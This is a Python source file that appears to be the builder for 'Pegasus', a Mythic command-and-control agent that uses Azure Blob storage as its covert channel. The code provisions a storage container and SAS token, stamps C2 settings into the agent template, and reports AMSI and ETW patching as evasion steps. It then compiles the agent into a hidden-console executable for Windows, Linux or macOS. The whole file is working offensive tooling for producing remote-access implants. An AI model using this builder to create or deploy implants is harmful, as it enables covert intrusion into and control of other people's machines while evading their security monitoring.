from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import json
import base64
import subprocess
import shutil
from datetime import datetime, timedelta
from pathlib import Path

from azure.storage.blob import BlobServiceClient, generate_container_sas, ContainerSasPermissions

class Pegasus(PayloadType):
    name = "pegasus"
    author = "@sender, @KingoftheNOPs, @its-a-feature, @auntra-entra, @n0mad, @Lavender-exe"
    description = "Pegasus - Azure Blob C2 agent with evasive capabilities"
    supported_os = [SupportedOS.Linux, SupportedOS.MacOS, SupportedOS.Windows]
    file_extension = "py"
    wrapper = False
    wrapped_payloads = []
    supports_dynamic_loading = False
    mythic_encrypts = True
    translation_container = None
    agent_type = "agent"
    agent_path = Path(".") / "pegasus" / "agent_code"
    agent_code_path = Path(".") / "pegasus" / "agent_code"
    agent_icon_path = Path(".") / "pegasus" / "pegasus.svg"
    c2_parameter_deviations = {
        "azure_blob": {
            "AESPSK": C2ParameterDeviation(supported=False),
            "encrypted_exchange_check": C2ParameterDeviation(supported=False),
        }
    }
    c2_profiles = ["azure_blob"]

    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["py", "exe"],
            default_value="py",
            description="Output as Python script or compiled executable",
        ),
    ]

    build_steps = [
        BuildStep(step_name="Provisioning Azure Container", step_description="Creating container and generating SAS token"),
        BuildStep(step_name="Stamping Configuration", step_description="Embedding configuration into agent"),
        BuildStep(step_name="Applying Evasion", step_description="Configuring anti-analysis and evasion features"),
        BuildStep(step_name="Compiling Payload", step_description="Compiling to executable or packaging script"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            agent_template_path = self.agent_code_path / "agent.py"
            if not agent_template_path.exists():
                resp.status = BuildStatus.Error
                resp.build_stderr = f"Agent template not found: {agent_template_path}"
                return resp

            with open(agent_template_path, "r") as f:
                agent_code = f.read()
            killdate = None
            output_type = self.get_parameter("output_type")

            for c2 in self.c2info:
                profile_name = c2.get_c2profile()["name"]

                if profile_name == "azure_blob":
                    params = c2.get_parameters_dict()
                    killdate = params.get("killdate", None)
                    callback_interval = str(params.get("callback_interval", "5"))
                    callback_jitter = str(params.get("callback_jitter", "10"))

                    config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
                        ServiceName="azure_blob",
                        ServiceRPCFunction="generate_config",
                        ServiceRPCFunctionArguments={"killdate": killdate, "payload_uuid": self.uuid}
                    ))
                    if not config_data.Success:
                        resp.status = BuildStatus.Error
                        resp.build_stderr = f"Build failed: {config_data.Error}"
                        return resp
                    container_url = f"{config_data.Result['blob_endpoint']}/{config_data.Result['container_name']}"
                    sas_preview = config_data.Result['sas_token'][:30] + "..." if len(config_data.Result['sas_token']) > 30 else config_data.Result['sas_token']

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid, StepName="Provisioning Azure Container",
                        StepStdout=f"Container: {config_data.Result['container_name']}\nURL: {container_url}\nSAS Expiration: {killdate or 'Not set'}\nPermissions: read, write, list, add, create, delete\nSAS Token: {sas_preview}",
                        StepSuccess=True))

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid, StepName="Stamping Configuration",
                        StepStdout=f"Endpoint: {config_data.Result['blob_endpoint']}\nContainer: {config_data.Result['container_name']}\nCallback Interval: {callback_interval}s\nCallback Jitter: {callback_jitter}%\n",
                        StepSuccess=True))

                    agent_code = agent_code.replace("BLOB_ENDPOINT_PLACEHOLDER", config_data.Result['blob_endpoint'])
                    agent_code = agent_code.replace("CONTAINER_NAME_PLACEHOLDER", config_data.Result['container_name'])
                    agent_code = agent_code.replace("CONTAINER_SAS_PLACEHOLDER", config_data.Result['sas_token'])
                    agent_code = agent_code.replace("CALLBACK_INTERVAL_PLACEHOLDER", callback_interval)
                    agent_code = agent_code.replace("CALLBACK_JITTER_PLACEHOLDER", callback_jitter)
                    agent_code = agent_code.replace("AGENT_UUID_PLACEHOLDER", self.uuid)
                    agent_code = agent_code.replace("KILLDATE_PLACEHOLDER", killdate or "")

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid, StepName="Applying Evasion",
                        StepStdout="AMSI patch: enabled\nETW patch: enabled\nKilldate: " + (killdate or "none"),
                        StepSuccess=True))

            if output_type == "exe":
                compile_result = await self._compile_exe(agent_code)
                if compile_result["success"]:
                    resp.payload = compile_result["payload"]
                    resp.status = BuildStatus.Success
                    resp.build_message = compile_result["message"]
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid, StepName="Compiling Payload",
                        StepStdout=compile_result["message"], StepSuccess=True))
                else:
                    resp.status = BuildStatus.Error
                    resp.build_stderr = compile_result["error"]
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid, StepName="Compiling Payload",
                        StepStdout=compile_result["error"], StepSuccess=False))
                    return resp
            else:
                resp.payload = agent_code.encode()
                resp.status = BuildStatus.Success
                resp.build_message = "Python script payload ready"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid, StepName="Compiling Payload",
                    StepStdout="Output: Python script (.py)\nNo compilation needed",
                    StepSuccess=True))

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_stderr = f"Build failed: {str(e)}"

        return resp

    async def _compile_exe(self, agent_code: str) -> dict:
        """Compile stamped agent to a standalone executable.

        Linux/macOS: native PyInstaller --onefile in the container.
        Windows: PyInstaller via Wine + embedded Windows Python 3.14 at /opt/win-python/.
        """
        build_dir = "/tmp/pegasus_build"
        try:
            if os.path.exists(build_dir):
                shutil.rmtree(build_dir)
            os.makedirs(build_dir, exist_ok=True)

            agent_path = os.path.join(build_dir, "agent.py")
            dist_dir = os.path.join(build_dir, "dist")
            work_dir = os.path.join(build_dir, "work")

            with open(agent_path, "w") as f:
                f.write(agent_code)

            target_os = self.selected_os

            if target_os == "Windows":
                win_python = "/opt/win-python/python.exe"
                wine_available = shutil.which("wine64") is not None
                if not os.path.exists(win_python) or not wine_available:
                    # Wine cross-compilation not available — fall back to
                    # native PyInstaller producing a Linux ELF with a warning
                    cmd = [
                        "pyinstaller",
                        "--onefile", "--noconsole", "--clean", "--strip",
                        "--name", "pegasus",
                        "--distpath", dist_dir,
                        "--workpath", work_dir,
                        "--specpath", build_dir,
                        agent_path,
                    ]
                    exe_name = "pegasus"
                    fallback_warning = (
                        "WARNING: Wine cross-compilation not available "
                        "(wine64 or /opt/win-python/python.exe missing). "
                        "Built a LINUX ELF binary instead. To get a "
                        "Windows .exe, install wine64 + Windows Python "
                        "in the Pegasus container.\n"
                    )
                else:
                    wine_agent = "Z:" + agent_path.replace("/", "\\")
                    wine_dist = "Z:" + dist_dir.replace("/", "\\")
                    wine_work = "Z:" + work_dir.replace("/", "\\")
                    wine_spec = "Z:" + build_dir.replace("/", "\\")
                    cmd = [
                        "wine64", win_python, "-m", "PyInstaller",
                        "--onefile", "--noconsole", "--clean",
                        "--name", "pegasus",
                        "--distpath", wine_dist,
                        "--workpath", wine_work,
                        "--specpath", wine_spec,
                        wine_agent,
                    ]
                    exe_name = "pegasus.exe"
                    fallback_warning = ""
            else:
                cmd = [
                    "pyinstaller",
                    "--onefile", "--noconsole", "--clean", "--strip",
                    "--name", "pegasus",
                    "--distpath", dist_dir,
                    "--workpath", work_dir,
                    "--specpath", build_dir,
                    agent_path,
                ]
                exe_name = "pegasus"
                fallback_warning = ""

            env = {**os.environ, "WINEDEBUG": "-all"}
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600, env=env)

            exe_path = os.path.join(dist_dir, exe_name)
            if result.returncode != 0 or not os.path.exists(exe_path):
                stderr_tail = result.stderr[-3000:] if result.stderr else "(no stderr)"
                stdout_tail = result.stdout[-1000:] if result.stdout else ""
                return {
                    "success": False,
                    "error": f"PyInstaller exited {result.returncode}\n--- stderr ---\n{stderr_tail}\n--- stdout ---\n{stdout_tail}",
                }

            with open(exe_path, "rb") as f:
                payload_bytes = f.read()

            size_mb = len(payload_bytes) / (1024 * 1024)
            return {
                "success": True,
                "payload": payload_bytes,
                "message": f"{fallback_warning}Compiled {exe_name} for {target_os} ({size_mb:.1f} MB, PyInstaller --onefile)",
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Compilation timed out after 600 seconds"}
        except Exception as e:
            return {"success": False, "error": f"Compilation error: {str(e)}"}
        finally:
            shutil.rmtree(build_dir, ignore_errors=True)
